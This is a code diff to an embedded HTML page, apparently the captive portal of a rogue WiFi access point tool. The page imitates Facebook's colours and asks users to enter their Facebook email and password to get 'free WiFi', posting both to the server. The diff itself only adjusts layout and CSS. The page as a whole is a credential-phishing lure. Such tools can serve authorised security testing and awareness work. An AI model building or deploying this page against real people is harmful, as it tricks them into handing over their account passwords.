@@ -32,7 +32,10 @@ HTML_RESPONSE = """
             body { text-align: center; padding: 10%; font: 20px San Francisco, sans-serif; color: #ffffff; background-color: #3b5998; }
             h1 { font-size: 50px; margin: 0; text-align: center;}
             p { text-align: center;}
-            img { display: block; margin-left: auto; margin-right: auto;}
+            laben, input { display: block; }
+            #wrapper { text-align: center; }
+            #login { display: inline-block; }
+            img { display: block; margin-left: auto; margin-right: auto; max-width: 100%; max-height: 100vh; height: auto;}
             article { display: block; text-align: left; max-width: 650px; margin: 0 auto; }
             @media only screen and (max-width : 480px) {
                 h1 { font-size: 40px; }
@@ -215,15 +218,17 @@ sX4AAAAASUVORK5CYII=">
                 <h1>Use facebook to get free WiFi!</h1>
                 <p>Please login with your facebook account and like our site,</p>
                 <p>afterwards you will be able to use our WiFi.</p>
-                <form action="/" id="login" method="POST">
-                    <label for="email">E-Mail</label>
-                    <input type="text" name="email" id="email">
+                <div id="wrapper">
+                    <form action="/" id="login" method="POST">
+                        <label for="email">E-Mail</label>
+                        <input type="text" name="email" id="email">
 
-                    <label for="password">Password</label>
-                    <input type="password" name="password" id="password">
+                        <label for="password">Password</label>
+                        <input type="password" name="password" id="password">
 
-                    <button type="submit">Login</button>
-                </form>
+                        <button type="submit">Login</button>
+                    </form>
+                </div>
             </article>
     </body>
 </html>
